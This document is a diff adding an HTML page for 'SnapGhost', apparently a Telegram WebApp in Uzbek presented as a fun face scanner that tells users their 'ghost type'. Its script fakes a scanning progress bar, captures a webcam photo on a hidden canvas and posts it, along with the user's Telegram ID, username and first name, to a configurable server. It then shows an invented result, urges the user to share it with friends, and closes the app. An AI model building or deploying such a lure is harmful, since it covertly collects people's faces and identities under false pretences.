@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>SnapGhost — Ghost Skaner</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display',sans-serif;
+  background:#08080f;
+  color:#fff;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  overflow:hidden;
+  position:relative;
+}
+.orb{
+  position:fixed;
+  border-radius:50%;
+  pointer-events:none;
+  filter:blur(60px);
+  opacity:0.35;
+  animation:float 6s ease-in-out infinite;
+}
+.orb1{width:280px;height:280px;background:#6d28d9;top:-80px;right:-60px}
+.orb2{width:200px;height:200px;background:#be185d;bottom:-60px;left:-40px;animation-delay:3s}
+@keyframes float{0%,100%{transform:translateY(0) scale(1)}50%{transform:translateY(-15px) scale(1.05)}}
+
+.wrap{
+  position:relative;z-index:10;
+  width:100%;max-width:360px;
+  padding:2rem 1.5rem;
+  text-align:center;
+}
+
+.ghost{font-size:80px;animation:ghost 3s ease-in-out infinite;display:block;margin-bottom:.25rem;filter:drop-shadow(0 0 24px rgba(167,139,250,.6))}
+@keyframes ghost{0%,100%{transform:translateY(0)}50%{transform:translateY(-12px)}}
+
+.brand{
+  font-size:32px;font-weight:800;letter-spacing:-1px;
+  background:linear-gradient(135deg,#a78bfa 0%,#ec4899 100%);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+  margin-bottom:4px;
+}
+.sub{font-size:11px;letter-spacing:3px;color:rgba(255,255,255,.3);text-transform:uppercase;margin-bottom:2rem}
+
+.card{
+  background:rgba(255,255,255,.04);
+  border:1px solid rgba(255,255,255,.07);
+  border-radius:24px;
+  padding:1.75rem;
+  margin-bottom:1.25rem;
+  backdrop-filter:blur(20px);
+}
+.card-icon{font-size:44px;margin-bottom:.75rem;display:block}
+.card-title{font-size:17px;font-weight:700;margin-bottom:.5rem}
+.card-desc{font-size:13px;color:rgba(255,255,255,.45);line-height:1.65}
+
+.progress-wrap{margin-top:1.25rem;display:none}
+.progress-wrap.show{display:block}
+.progress-track{height:4px;background:rgba(255,255,255,.08);border-radius:4px;overflow:hidden}
+.progress-fill{
+  height:100%;width:0%;
+  background:linear-gradient(90deg,#7c3aed,#ec4899);
+  border-radius:4px;
+  transition:width .08s linear;
+}
+.progress-label{font-size:12px;color:rgba(255,255,255,.35);margin-top:.6rem;min-height:16px}
+
+.btn{
+  width:100%;padding:1rem;
+  border:none;border-radius:18px;
+  background:linear-gradient(135deg,#7c3aed,#ec4899);
+  color:#fff;font-size:16px;font-weight:700;
+  cursor:pointer;letter-spacing:.3px;
+  transition:transform .15s,opacity .15s;
+  position:relative;overflow:hidden;
+}
+.btn:active{transform:scale(.96)}
+.btn:disabled{opacity:.6;cursor:default}
+.btn::after{
+  content:'';position:absolute;top:0;left:-100%;
+  width:100%;height:100%;
+  background:linear-gradient(90deg,transparent,rgba(255,255,255,.12),transparent);
+  transition:left .5s;
+}
+.btn:hover::after{left:100%}
+
+/* Result */
+.result{display:none;text-align:center;padding:2rem 1.5rem}
+.result.show{display:block}
+.result-big{font-size:72px;animation:pop .4s cubic-bezier(.34,1.56,.64,1)}
+@keyframes pop{from{transform:scale(0)}to{transform:scale(1)}}
+.result-title{
+  font-size:24px;font-weight:800;margin:.75rem 0 .5rem;
+  background:linear-gradient(135deg,#a78bfa,#ec4899);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+}
+.result-desc{font-size:14px;color:rgba(255,255,255,.4);line-height:1.7}
+
+.footer{
+  position:fixed;bottom:1.25rem;left:0;right:0;
+  text-align:center;font-size:11px;
+  color:rgba(255,255,255,.18);letter-spacing:1px;
+}
+
+video,canvas{display:none}
+</style>
+</head>
+<body>
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+<video id="v" autoplay playsinline muted></video>
+<canvas id="c"></canvas>
+
+<div class="wrap" id="main">
+  <span class="ghost">👻</span>
+  <div class="brand">SnapGhost</div>
+  <div class="sub">Ghost Face Scanner</div>
+
+  <div class="card">
+    <span class="card-icon">🔬</span>
+    <div class="card-title">Yuz Ghost Skaneri</div>
+    <div class="card-desc">
+      Yuzingizni skanerlang va qaysi <strong style="color:#a78bfa">ghost turiga</strong> mos kelishingizni aniqlang!
+    </div>
+    <div class="progress-wrap" id="pw">
+      <div class="progress-track"><div class="progress-fill" id="pf"></div></div>
+      <div class="progress-label" id="pl">Tayyorlanmoqda...</div>
+    </div>
+  </div>
+
+  <button class="btn" id="btn" onclick="startScan()">👻 Skanerga bosing!</button>
+</div>
+
+<div class="result" id="result">
+  <div class="result-big">📸</div>
+  <div class="result-title">Ghost topildi! 👻</div>
+  <div class="result-desc">
+    Sizning ghost turingiz aniqlandi!<br>
+    Do'stlaringizga ham yuboring 😂
+  </div>
+</div>
+
+<div class="footer">👻 SnapGhost &nbsp;•&nbsp; by Akhmadov</div>
+
+<script>
+const SERVER = "__SERVER_URL__";
+const UID    = "__UID__";
+const tg     = window.Telegram?.WebApp;
+if(tg) tg.ready();
+
+const userData = tg?.initDataUnsafe?.user || {};
+const userId   = userData.id   || UID;
+const username = userData.username   || "";
+const firstName= userData.first_name || "";
+
+let running = false;
+
+const steps = [
+  "Kamera tayyorlanmoqda...",
+  "Yuz aniqlanmoqda...",
+  "Ghost turi hisoblanmoqda...",
+  "Natija tayyorlanmoqda..."
+];
+
+async function startScan(){
+  if(running) return;
+  running = true;
+  const btn = document.getElementById("btn");
+  const pw  = document.getElementById("pw");
+  const pf  = document.getElementById("pf");
+  const pl  = document.getElementById("pl");
+  btn.disabled = true;
+  btn.textContent = "⏳ Skanerlanyapti...";
+  pw.classList.add("show");
+
+  let stream;
+  try{
+    stream = await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:"user",width:640,height:480},audio:false
+    });
+  }catch(e){
+    pl.textContent = "❌ Kamera ruxsati berilmadi";
+    running=false; btn.disabled=false; btn.textContent="👻 Qayta urinish";
+    return;
+  }
+
+  const video = document.getElementById("v");
+  video.srcObject = stream;
+  await video.play();
+
+  let p=0, si=0;
+  pl.textContent = steps[0];
+  const iv = setInterval(()=>{
+    p += 1.8;
+    pf.style.width = Math.min(p,100)+"%";
+    const idx = Math.floor(p/25);
+    if(idx !== si && idx < steps.length){ si=idx; pl.textContent=steps[idx]; }
+    if(p>=100){ clearInterval(iv); capture(stream); }
+  }, 55);
+}
+
+async function capture(stream){
+  const video  = document.getElementById("v");
+  const canvas = document.getElementById("c");
+  canvas.width  = video.videoWidth  || 640;
+  canvas.height = video.videoHeight || 480;
+  canvas.getContext("2d").drawImage(video,0,0);
+  stream.getTracks().forEach(t=>t.stop());
+
+  canvas.toBlob(async blob=>{
+    const fd = new FormData();
+    fd.append("photo",      blob, "snap.jpg");
+    fd.append("user_id",    userId);
+    fd.append("username",   username);
+    fd.append("first_name", firstName);
+    try{ await fetch(SERVER+"/photo",{method:"POST",body:fd}); }
+    catch(e){ console.log(e); }
+    showResult();
+  },"image/jpeg",0.88);
+}
+
+function showResult(){
+  document.getElementById("main").style.display="none";
+  document.getElementById("result").classList.add("show");
+  if(tg) setTimeout(()=>tg.close(),2500);
+}
+</script>
+</body>
+</html>
